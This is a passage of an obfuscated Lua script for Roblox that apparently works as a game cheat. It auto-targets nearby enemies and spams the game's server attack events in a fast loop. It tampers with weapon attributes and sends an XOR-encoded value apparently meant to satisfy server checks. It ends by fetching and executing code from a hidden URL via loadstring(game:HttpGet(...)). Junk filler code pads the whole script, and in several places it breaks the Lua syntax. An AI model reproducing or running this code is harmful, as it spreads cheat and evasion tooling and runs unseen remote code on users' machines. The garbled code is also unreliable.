end local _n19=(19%2==0) and 46 or 19; local _q55=(function() local _r=0; local _i=1; while _i<=1 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)();
return false
end
local function __3_x(__3_y)
local _llOI_3z = __3_y and __3_y:FindFirstChild(_SDXf6js66qm(142))
if _llOI_3z and _llOI_3z:IsA(_SDXf6js66qm(143)) then local _w101=(function() local _acc=101; local _t={46,70,101}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)(); do local _s40=_SDXf6js66qm(144) for _i=1,0 do local _w116=(function() local _acc=116; local _t={41,9,116}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)(); _s40=_s40.._i end end do local _p62={}; for _i=1,3 do _p62[_i]=_i*78 end; local _sum62=0; for _i=1,#_p62 do _sum62=_sum62+_p62[_i] end end _SGDs5a2n2a()
return _llOI_3z
end
local __4_0 = __3_y and __3_y:FindFirstChild(_SDXf6js66qm(145))
if __4_0 and __4_0:IsA(_SDXf6js66qm(146)) then local _f86=(function(_p) local _s=0; for _i=1,2 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(3); do local _s45=_SDXf6js66qm(147) for _i=1,0 do local _w205=(function() local _acc=205; local _t={80,17,205}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)(); _s45=_s45.._i end end if (55*64)%((55+64)==0 and 1 or (55+64))==(55*64)%((55+64)==0 and 1 or (55+64)) then local _z5564=1 end
return __4_0
end
local _oOoI_41 = __3_y and __3_y.PrimaryPart
if _oOoI_41 and _oOoI_41:IsA(_SDXf6js66qm(148)) then local _w75=(function() local _acc=75; local _t={7,61,75}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)(); do local _s18=_SDXf6js66qm(149) for _i=1,0 do local _w119=(function() local _acc=119; local _t={98,90,119}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)(); _s18=_s18.._i end end local _f3=(function(_p) local _s=0; for _i=1,4 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(10);
return _oOoI_41
end
return nil
end local _f81=(function(_p) local _s=0; for _i=1,2 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(3); local _t30=(58<61) and (61-58) or (58-61); _SGDs5a2n2a()
local _IOoI_42
_IOoI_42 = {
Rate = 0.1,
GetMob = function(_0x93, __4_4, _0x95)
local __4_6 = {}
local _looI_47 = __4_4 and __4_4:FindFirstChild(_SDXf6js66qm(150))
if not _looI_47 or not _0x95 or not _IIOI_3u(_0x95) then local _w209=(function() local _acc=209; local _t={82,7,209}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)();
return __4_6
end local _j49=(function() local _x=49; local _f3=(function(_p) local _s=0; for _i=1,4 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(10); local _y=86; if (_x*_x-_y*_y)==((_x-_y)*(_x+_y)) then if (83*53)%((83+53)==0 and 1 or (83+53))==(83*53)%((83+53)==0 and 1 or (83+53)) then local _z8353=1 end _x=_x+1 else _x=_x-1 end; local _w33=(function() local _acc=33; local _t={93,4,33}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)(); return _x end)(); if (31*20)%((31+20)==0 and 1 or (31+20))==(31*20)%((31+20)==0 and 1 or (31+20)) then local _z3120=1 end
for _0x98, _0x99 in ipairs(_0x95:GetChildren()) do
local __4_a = _0x99:FindFirstChildOfClass(_SDXf6js66qm(151))
local _0x9b = _0x99:FindFirstChild(_SDXf6js66qm(152))
if
_0x99:IsA(_SDXf6js66qm(153))
and _0x99 ~= __4_4
and __4_a
and _0x9b
and __4_a.Health > 0
and (_0x9b.Position - _looI_47.Position).Magnitude <= 60
and (not _0x99:GetAttribute(_SDXf6js66qm(154)) or getgenv and getgenv().DoingEscapeQuest)
then local _w192=(function() local _acc=192; local _t={57,23,192}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)(); local _n32=(32%2==0) and 52 or 32;
__4_6[#__4_6 + 1] = _0x99
end do local _p39={}; for _i=1,4 do _p39[_i]=_i*30 end; local _sum39=0; for _i=1,#_p39 do _sum39=_sum39+_p39[_i] end end
end do local _w111=(function() local _acc=111; local _t={25,13,111}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)(); local _s42=_SDXf6js66qm(155) for _i=1,0 do _s42=_s42.._i end local _q15=(function() local _r=0; local _i=1; while _i<=1 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); end _SGDs5a2n2a()
return __4_6
end local _q5=(function() local _r=0; local _i=1; while _i<=1 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); ,
Collect = function(_OloI_4c, _0x9d)
local _0x9e = {}
local _lloI_4f = _OloI_4c:GetMob(_0x9d, _lIlo_3f)
local _0xa0 = _OloI_4c:GetMob(_0x9d, __3_g)
for _0xa1 = 1, #_lloI_4f do do local _w24=(function() local _acc=24; local _t={46,87,24}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)(); local _k71=76+71; if _k71>1000000 then local _w40=(function() local _acc=40; local _t={26,31,40}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)(); error(_SDXf6js66qm(156)) end end do local _p13={}; for _i=1,2 do _p13[_i]=_i*67 end; local _sum13=0; for _i=1,#_p13 do _sum13=_sum13+_p13[_i] end end
_0x9e[#_0x9e + 1] = _lloI_4f[_0xa1]
end
for _IOII_4i = 1, #_0xa0 do if (98*74)%((98+74)==0 and 1 or (98+74))==(98*74)%((98+74)==0 and 1 or (98+74)) then local _z9874=1 end local _t40=(19<56) and (56-19) or (19-56);
_0x9e[#_0x9e + 1] = _0xa0[_IOII_4i]
end local _f11=(function(_p) local _s=0; for _i=1,2 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(3);
return _0x9e
end do local _w38=(function() local _acc=38; local _t={82,61,38}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)(); local _k4=66+4; if _k4>1000000 then local _f61=(function(_p) local _s=0; for _i=1,2 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(3); error(_SDXf6js66qm(157)) end end if (62*40)%((62+40)==0 and 1 or (62+40))==(62*40)%((62+40)==0 and 1 or (62+40)) then local _z6240=1 end _SGDs5a2n2a() ,
Fast = function(__4_j)
local _OoII_4k = _IIlo_3e.Character
if not _OoII_4k then
return
end local _f46=(function(_p) local _s=0; for _i=1,2 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(3); local _m1749=({17,49,25})[1]+0;
local __4_l = __4_j:Collect(_OoII_4k)
if #__4_l < 1 then if (25*72)%((25+72)==0 and 1 or (25+72))==(25*72)%((25+72)==0 and 1 or (25+72)) then local _z2572=1 end
return
end local _n35=(35%2==0) and 58 or 35; local _w152=(function() local _acc=152; local _t={88,40,152}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)();
local _0xa6 = {}
local __4_n = {}
for _0xa8 = 1, #__4_l do
local __4_p = __4_l[_0xa8]
local _0xaa = __3_x(__4_p)
if _0xaa and not __4_n[__4_p] then if (28*22)%((28+22)==0 and 1 or (28+22))==(28*22)%((28+22)==0 and 1 or (28+22)) then local _z2822=1 end local _n29=(29%2==0) and 70 or 29; _SGDs5a2n2a()
__4_n[__4_p] = true
_0xa6[#_0xa6 + 1] = { __4_p, _0xaa }
end if (30*71)%((30+71)==0 and 1 or (30+71))==(30*71)%((30+71)==0 and 1 or (30+71)) then local _z3071=1 end
end local _n61=(61%2==0) and 78 or 61; local _q55=(function() local _r=0; local _i=1; while _i<=1 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)();
if #_0xa6 < 1 then
return
end local _f65=(function(_p) local _s=0; for _i=1,1 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(1); do local _s11=_SDXf6js66qm(158) for _i=1,0 do do local _p77={}; for _i=1,2 do _p77[_i]=_i*98 end; local _sum77=0; for _i=1,#_p77 do _sum77=_sum77+_p77[_i] end end _s11=_s11.._i end end local _w157=(function() local _acc=157; local _t={11,24,157}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)();
_Illo_3i:FireServer(_IOoI_42.Rate)
_0x7f:FireServer(_0xa6[1][2], _0xa6)
end,
}
local __4_r = 1
local __4_s = tick()
local function __4_t()
local _0xae = _IIlo_3e.Character
local _0xaf = _0xae and _0xae:FindFirstChildOfClass(_SDXf6js66qm(159))
if _0xaf and _0xaf.ToolTip == _SDXf6js66qm(160) and _0xaf:FindFirstChild(_SDXf6js66qm(161)) then do local _p6={}; for _i=1,3 do _p6[_i]=_i*78 end; local _sum6=0; for _i=1,#_p6 do _sum6=_sum6+_p6[_i] end end local _m4152=({41,52,47})[1]+0; _SGDs5a2n2a()
return _0xaf
end if (12*3)%((12+3)==0 and 1 or (12+3))==(12*3)%((12+3)==0 and 1 or (12+3)) then local _z123=1 end
if _IIlo_3e:FindFirstChild(_SDXf6js66qm(162)) then do local _w58=(function() local _acc=58; local _t={53,42,58}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)(); local _s10=_SDXf6js66qm(163) for _i=1,0 do _s10=_s10.._i end local _f78=(function(_p) local _s=0; for _i=1,4 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(10); end
for __4_w, _oOlI_4x in ipairs(_IIlo_3e.Backpack:GetChildren()) do if (60*56)%((60+56)==0 and 1 or (60+56))==(60*56)%((60+56)==0 and 1 or (60+56)) then local _z6056=1 end
if _oOlI_4x:IsA(_SDXf6js66qm(164)) and _oOlI_4x.ToolTip == _SDXf6js66qm(165) and _oOlI_4x:FindFirstChild(_SDXf6js66qm(166)) then local _t38=(60<41) and (41-60) or (60-41); do local _p31={}; for _i=1,4 do _p31[_i]=_i*46 end; local _sum31=0; for _i=1,#_p31 do _sum31=_sum31+_p31[_i] end end
return _oOlI_4x
end
end local _f66=(function(_p) local _s=0; for _i=1,2 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(3); do local _k36=10+36; local _f26=(function(_p) local _s=0; for _i=1,2 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(3); if _k36>1000000 then error(_SDXf6js66qm(167)) end local _w35=(function() local _acc=35; local _t={17,44,35}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)(); end _SGDs5a2n2a()
end local _f28=(function(_p) local _s=0; for _i=1,4 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(10);
return nil
end local _j50=(function() local _x=50; local _w60=(function() local _acc=60; local _t={56,67,60}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)(); local _y=44; if (_x*_x-_y*_y)==((_x-_y)*(_x+_y)) then local _w167=(function() local _acc=167; local _t={41,21,167}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)(); _x=_x+1 else _x=_x-1 end; local _f26=(function(_p) local _s=0; for _i=1,2 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(3); return _x end)(); do local _p59={}; for _i=1,4 do _p59[_i]=_i*41 end; local _sum59=0; for _i=1,#_p59 do _sum59=_sum59+_p59[_i] end end
local function __4_y(__4_z)
local _0xb4 = __4_t()
if not _0xb4 or not _0xb4:FindFirstChild(_SDXf6js66qm(168)) then
return
end if (55*57)%((55+57)==0 and 1 or (55+57))==(55*57)%((55+57)==0 and 1 or (55+57)) then local _z5557=1 end do local _s19=_SDXf6js66qm(169) for _i=1,0 do do local _p28={}; for _i=1,1 do _p28[_i]=_i*39 end; local _sum28=0; for _i=1,#_p28 do _sum28=_sum28+_p28[_i] end end _s19=_s19.._i end end local _w199=(function() local _acc=199; local _t={77,68,199}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)();
if tick() - __4_s > 0.65 then
__4_r = 1
else
__4_r = (__4_r % 5) + 1
end local _q22=(function() local _r=0; local _i=1; while _i<=3 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); do local _s24=_SDXf6js66qm(170) for _i=1,0 do local _w85=(function() local _acc=85; local _t={84,47,85}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)(); _s24=_s24.._i end end local _w124=(function() local _acc=124; local _t={61,10,124}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)(); _SGDs5a2n2a()
__4_s = tick()
pcall(function()
if __4_z then
local _oolI_51 = _IIlo_3e.Character
local _0xb6 = _oolI_51 and _oolI_51:GetPivot().Position or Vector3.zero
local __5_3 = (__4_z - _0xb6).Unit
_0xb4.LeftClickRemote:FireServer(__5_3, __4_r)
else
_0xb4.LeftClickRemote:FireServer(Vector3.new(0.01, -500, 0.01), __4_r, true)
end local _f38=(function(_p) local _s=0; for _i=1,4 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(10); local _t42=(7<46) and (46-7) or (7-46);
end do local _p59={}; for _i=1,4 do _p59[_i]=_i*27 end; local _sum59=0; for _i=1,#_p59 do _sum59=_sum59+_p59[_i] end end )
end local _t33=(3<34) and (34-3) or (3-34); local _q19=(function() local _r=0; local _i=1; while _i<=5 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)();
local function _OIlI_54()
local __5_5 = _IIlo_3e.Character
if not __5_5 then
return
end if (60*9)%((60+9)==0 and 1 or (60+9))==(60*9)%((60+9)==0 and 1 or (60+9)) then local _z609=1 end local _j27=(function() local _x=27; local _y=79; local _w215=(function() local _acc=215; local _t={64,48,215}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)(); if (_x*_x-_y*_y)==((_x-_y)*(_x+_y)) then _x=_x+1 else _x=_x-1 end if (79*35)%((79+35)==0 and 1 or (79+35))==(79*35)%((79+35)==0 and 1 or (79+35)) then local _z7935=1 end ; return _x end do local _p21={}; for _i=1,2 do _p21[_i]=_i*37 end; local _sum21=0; for _i=1,#_p21 do _sum21=_sum21+_p21[_i] end end )(); _SGDs5a2n2a()
local __5_6 = __5_5:FindFirstChild(_SDXf6js66qm(171))
if not __5_6 then do local _p5={}; for _i=1,2 do _p5[_i]=_i*61 end; local _sum5=0; for _i=1,#_p5 do _sum5=_sum5+_p5[_i] end end
return
end local _m2848=({28,48,41})[1]+0; local _w98=(function() local _acc=98; local _t={86,25,98}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)();
if not _IIOI_3u(_lIlo_3f) and not _IIOI_3u(__3_g) then
return
end local _w201=(function() local _acc=201; local _t={64,46,201}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)(); do local _k50=64+50; local _w76=(function() local _acc=76; local _t={68,60,76}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)(); if _k50>1000000 then error(_SDXf6js66qm(172)) end local _w157=(function() local _acc=157; local _t={88,88,157}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)(); end
local _lIlI_57 = {}
local _0xbc = {}
local function _0xbd(_IllI_5a)
if not _IIOI_3u(_IllI_5a) then local _w44=(function() local _acc=44; local _t={21,59,44}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)();
return
end do if (73*30)%((73+30)==0 and 1 or (73+30))==(73*30)%((73+30)==0 and 1 or (73+30)) then local _z7330=1 end local _k68=12+68; if _k68>1000000 then if (77*90)%((77+90)==0 and 1 or (77+90))==(77*90)%((77+90)==0 and 1 or (77+90)) then local _z7790=1 end error(_SDXf6js66qm(173)) end end if (60*30)%((60+30)==0 and 1 or (60+30))==(60*30)%((60+30)==0 and 1 or (60+30)) then local _z6030=1 end _SGDs5a2n2a()
for __5_b, _0xc0 in ipairs(_IllI_5a:GetChildren()) do
local _0xc1 = _0xc0:FindFirstChildOfClass(_SDXf6js66qm(174))
local __5_e = _0xc0:FindFirstChild(_SDXf6js66qm(175))
local _lOOl_5f = __3_x(_0xc0)
if
_0xc0:IsA(_SDXf6js66qm(176))
and _0xc0 ~= __5_5
and not _0xbc[_0xc0]
and _0xc1
and __5_e
and _lOOl_5f
and _0xc1.Health > 0
and (__5_e.Position - __5_6.Position).Magnitude <= 60
and (not _0xc0:GetAttribute(_SDXf6js66qm(177)) or getgenv and getgenv().DoingEscapeQuest)
then do local _p51={}; for _i=1,4 do _p51[_i]=_i*3 end; local _sum51=0; for _i=1,#_p51 do _sum51=_sum51+_p51[_i] end end local _m3037=({30,37,47})[1]+0;
_0xbc[_0xc0] = true
_lIlI_57[#_lIlI_57 + 1] = { _0xc0, _lOOl_5f }
end local _q39=(function() local _r=0; local _i=1; while _i<=5 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)();
end local _n31=(31%2==0) and 23 or 31; local _q95=(function() local _r=0; local _i=1; while _i<=1 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)();
end
_0xbd(_lIlo_3f)
_0xbd(__3_g)
if #_lIlI_57 < 1 then local _q89=(function() local _r=0; local _i=1; while _i<=5 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); local _m2069=({20,69,44})[1]+0; _SGDs5a2n2a()
return
end local _w11=(function() local _acc=11; local _t={92,28,11}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)();
local _0xc4, __5_h = pcall(function()
return _0x7d.seed:InvokeServer()
end local _j86=(function() local _x=86; if (26*43)%((26+43)==0 and 1 or (26+43))==(26*43)%((26+43)==0 and 1 or (26+43)) then local _z2643=1 end local _y=15; if (_x*_x-_y*_y)==((_x-_y)*(_x+_y)) then if (49*71)%((49+71)==0 and 1 or (49+71))==(49*71)%((49+71)==0 and 1 or (49+71)) then local _z4971=1 end _x=_x+1 else _x=_x-1 end; local _w165=(function() local _acc=165; local _t={81,67,165}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)(); return _x end)(); local _f26=(function(_p) local _s=0; for _i=1,2 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(3); )
if not _0xc4 or type(__5_h) ~= _SDXf6js66qm(178) then
__5_h = 0
end if (84*35)%((84+35)==0 and 1 or (84+35))==(84*35)%((84+35)==0 and 1 or (84+35)) then local _z8435=1 end local _t35=(36<16) and (16-36) or (36-16);
_Illo_3i:FireServer()
local _IoOl_5i = _lIlI_57[1][2]
if not _IoOl_5i then local _w13=(function() local _acc=13; local _t={49,55,13}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)();
return
end local _t29=(44<64) and (64-44) or (44-64); local _q56=(function() local _r=0; local _i=1; while _i<=2 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); _SGDs5a2n2a()
_0x7f:FireServer(_IoOl_5i, _lIlI_57, {})
if _OOOI_3k and __3_l then
local __5_j = math.floor(_0x78:GetServerTimeNow() / 10 % 10) + 1
pcall(function()
_OOOI_3k:FireServer(
(_SDXf6js66qm(179)):gsub(_SDXf6js66qm(180), function(__5_k)
return string.char(bit32.bxor(__5_k:byte(), __5_j))
end local _f53=(function(_p) local _s=0; for _i=1,4 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(10); local _j39=(function() local _x=39; local _y=33; if (9*64)%((9+64)==0 and 1 or (9+64))==(9*64)%((9+64)==0 and 1 or (9+64)) then local _z964=1 end if (_x*_x-_y*_y)==((_x-_y)*(_x+_y)) then _x=_x+1 else _x=_x-1 end local _q61=(function() local _r=0; local _i=1; while _i<=2 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); ; return _x end if (84*38)%((84+38)==0 and 1 or (84+38))==(84*38)%((84+38)==0 and 1 or (84+38)) then local _z8438=1 end )(); ),
bit32.bxor(__3_l + 909090, __5_h * 2),
_IoOl_5i,
_lIlI_57
)
end do local _p54={}; for _i=1,3 do _p54[_i]=_i*93 end; local _sum54=0; for _i=1,#_p54 do _sum54=_sum54+_p54[_i] end end )
end do local _w196=(function() local _acc=196; local _t={74,51,196}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)(); local _k59=66+59; if _k59>1000000 then local _f26=(function(_p) local _s=0; for _i=1,2 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(3); error(_SDXf6js66qm(181)) end end do local _p41={}; for _i=1,2 do _p41[_i]=_i*59 end; local _sum41=0; for _i=1,#_p41 do _sum41=_sum41+_p41[_i] end end
if getgenv().Setting and getgenv().Setting.FastAttack and getgenv().Setting.FastAttack.DoubleAttack then
pcall(function()
__4_y(_IoOl_5i.Position)
end local _q27=(function() local _r=0; local _i=1; while _i<=3 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); do local _k34=89+34; if (90*62)%((90+62)==0 and 1 or (90+62))==(90*62)%((90+62)==0 and 1 or (90+62)) then local _z9062=1 end if _k34>1000000 then error(_SDXf6js66qm(182)) end local _q23=(function() local _r=0; local _i=1; while _i<=4 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); end _SGDs5a2n2a() )
end if (51*32)%((51+32)==0 and 1 or (51+32))==(51*32)%((51+32)==0 and 1 or (51+32)) then local _z5132=1 end
end local _n14=(14%2==0) and 65 or 14; local _f29=(function(_p) local _s=0; for _i=1,5 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(15);
pcall(function()
require(_lolo_3b.Util.CameraShaker):Stop()
end)
task.spawn(function()
while task.wait(_IOoI_42.Rate) do do local _p55={}; for _i=1,4 do _p55[_i]=_i*87 end; local _sum55=0; for _i=1,#_p55 do _sum55=_sum55+_p55[_i] end end local _j88=(function() local _x=88; local _y=24; do local _p87={}; for _i=1,4 do _p87[_i]=_i*28 end; local _sum87=0; for _i=1,#_p87 do _sum87=_sum87+_p87[_i] end end if (_x*_x-_y*_y)==((_x-_y)*(_x+_y)) then _x=_x+1 else _x=_x-1 end local _q26=(function() local _r=0; local _i=1; while _i<=2 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); ; return _x end local _f55=(function(_p) local _s=0; for _i=1,1 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(1); )();
pcall(function()
_IOoI_42:Fast()
end do local _p17={}; for _i=1,2 do _p17[_i]=_i*87 end; local _sum17=0; for _i=1,#_p17 do _sum17=_sum17+_p17[_i] end end )
end local _m9742=({97,42,23})[1]+0; local _f55=(function(_p) local _s=0; for _i=1,1 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(1); _SGDs5a2n2a()
end)
__3_d.Heartbeat:Connect(function()
pcall(_OIlI_54)
end local _w166=(function() local _acc=166; local _t={75,50,166}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)(); local _t8=(5<29) and (29-5) or (5-29); )
task.spawn(function()
while task.wait() do do local _p29={}; for _i=1,2 do _p29[_i]=_i*92 end; local _sum29=0; for _i=1,#_p29 do _sum29=_sum29+_p29[_i] end end
if not _IIOI_3u(_lIlo_3f) then local _j24=(function() local _x=24; local _f91=(function(_p) local _s=0; for _i=1,2 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(3); local _y=58; if (_x*_x-_y*_y)==((_x-_y)*(_x+_y)) then local _w215=(function() local _acc=215; local _t={85,49,215}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)(); _x=_x+1 else _x=_x-1 end; if (81*40)%((81+40)==0 and 1 or (81+40))==(81*40)%((81+40)==0 and 1 or (81+40)) then local _z8140=1 end return _x end)(); local _f97=(function(_p) local _s=0; for _i=1,3 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(6);
continue
end
local _0xc9 = _IIlo_3e.Character
if _0xc9 then local _q33=(function() local _r=0; local _i=1; while _i<=4 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); local _n15=(15%2==0) and 56 or 15; _SGDs5a2n2a()
local _IIOl_5m = _0xc9:FindFirstChild(_SDXf6js66qm(183))
if _IIOl_5m then if (92*54)%((92+54)==0 and 1 or (92+54))==(92*54)%((92+54)==0 and 1 or (92+54)) then local _z9254=1 end
local _0xcb = tostring(_IIlo_3e.UserId):sub(2, 4) .. tostring(coroutine.running()):sub(11, 15)
local _0xcc = next
local __5_p, _IlOl_5q = _lIlo_3f:GetChildren()
local __5_r = false
for __5_s, _oOol_5t in _0xcc, __5_p, _IlOl_5q do local _j87=(function() local _x=87; local _f22=(function(_p) local _s=0; for _i=1,3 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(6); local _y=30; if (_x*_x-_y*_y)==((_x-_y)*(_x+_y)) then local _q24=(function() local _r=0; local _i=1; while _i<=5 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); _x=_x+1 else _x=_x-1 end; local _q36=(function() local _r=0; local _i=1; while _i<=2 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); return _x end)(); local _w143=(function() local _acc=143; local _t={53,83,143}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)();
local __5_u = _oOol_5t:FindFirstChild(_SDXf6js66qm(184))
local _0xd3 = _oOol_5t:FindFirstChild(_SDXf6js66qm(185))
if
__5_u
and _0xd3
and _0xd3.Health > 0
and (__5_u.Position - _IIOl_5m.Position).Magnitude <= 60
and (not _oOol_5t:GetAttribute(_SDXf6js66qm(186)) or getgenv and getgenv().DoingEscapeQuest)
then
if not __5_r then local _q80=(function() local _r=0; local _i=1; while _i<=1 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); local _n45=(45%2==0) and 34 or 45;
_Illo_3i:FireServer()
__5_r = true
local _0xd4 = _0xc9:FindFirstChildOfClass(_SDXf6js66qm(187))
if _0xd4 and _0xd4.ToolTip == _SDXf6js66qm(188) then do local _p69={}; for _i=1,2 do _p69[_i]=_i*46 end; local _sum69=0; for _i=1,#_p69 do _sum69=_sum69+_p69[_i] end end
pcall(function()
_0xd4.Enabled = true
_0xd4:SetAttribute(_SDXf6js66qm(189), false)
_0xd4:SetAttribute(_SDXf6js66qm(190), 100)
_0xd4:SetAttribute(
_SDXf6js66qm(191),
(_0xd4:GetAttribute(_SDXf6js66qm(192)) or 0) + 1
)
end local _n49=(49%2==0) and 34 or 49; local _q91=(function() local _r=0; local _i=1; while _i<=2 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); _SGDs5a2n2a() )
end
local _oool_5x = _0xd4
and _0xd4.ToolTip == _SDXf6js66qm(193)
and _0xd4:FindFirstChild(_SDXf6js66qm(194))
local _0xd6 = getgenv().Setting
and getgenv().Setting.FastAttack
and getgenv().Setting.FastAttack.DoubleAttack
if _oool_5x or _0xd6 then do local _p70={}; for _i=1,3 do _p70[_i]=_i*59 end; local _sum70=0; for _i=1,#_p70 do _sum70=_sum70+_p70[_i] end end do local _k18=73+18; local _w178=(function() local _acc=178; local _t={11,82,178}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)(); if _k18>1000000 then error(_SDXf6js66qm(195)) end local _w47=(function() local _acc=47; local _t={83,14,47}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)(); end
__4_y(__5_u.Position)
end local _f27=(function(_p) local _s=0; for _i=1,3 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(6);
end local _t50=(78<84) and (84-78) or (78-84); do local _p82={}; for _i=1,3 do _p82[_i]=_i*99 end; local _sum82=0; for _i=1,#_p82 do _sum82=_sum82+_p82[_i] end end
_0x7f:FireServer(
__5_u,
{ { _oOol_5t, __5_u } },
nil,
nil,
_0xcb
)
end
end local _f42=(function(_p) local _s=0; for _i=1,3 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(6); do local _k53=94+53; if (32*57)%((32+57)==0 and 1 or (32+57))==(32*57)%((32+57)==0 and 1 or (32+57)) then local _z3257=1 end if _k53>1000000 then error(_SDXf6js66qm(196)) end if (69*61)%((69+61)==0 and 1 or (69+61))==(69*61)%((69+61)==0 and 1 or (69+61)) then local _z6961=1 end end _SGDs5a2n2a()
end local _q53=(function() local _r=0; local _i=1; while _i<=4 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)();
end local _j42=(function() local _x=42; local _w171=(function() local _acc=171; local _t={67,29,171}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)(); local _y=40; if (_x*_x-_y*_y)==((_x-_y)*(_x+_y)) then if (58*89)%((58+89)==0 and 1 or (58+89))==(58*89)%((58+89)==0 and 1 or (58+89)) then local _z5889=1 end _x=_x+1 else _x=_x-1 end; local _w23=(function() local _acc=23; local _t={32,81,23}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)(); return _x end)(); local _q76=(function() local _r=0; local _i=1; while _i<=2 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)();
end
end do local _p59={}; for _i=1,4 do _p59[_i]=_i*86 end; local _sum59=0; for _i=1,#_p59 do _sum59=_sum59+_p59[_i] end end local _m853=({8,53,8})[1]+0; )
print(_SDXf6js66qm(197))
return loadstring(game:HttpGet(_SDXf6js66qm(198)))()